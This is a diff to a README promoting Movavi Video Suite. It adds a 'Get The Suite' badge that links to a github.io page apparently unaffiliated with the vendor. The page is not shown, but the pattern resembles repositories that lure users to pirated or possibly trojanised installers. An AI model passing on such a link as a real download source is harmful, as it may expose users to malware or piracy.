@@ -2,7 +2,7 @@
 
 Video editing doesn’t need to be complicated. **Movavi Video Suite** provides everything you need to create professional-quality videos, convert files, record screens, and edit audio in one streamlined package. Designed for creators, businesses, and educators, Movavi simplifies workflows without sacrificing power.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Suite-blueviolet)](https://movavi-video-suite-tool.github.io/.github/)
 ---
 
 ## Overview
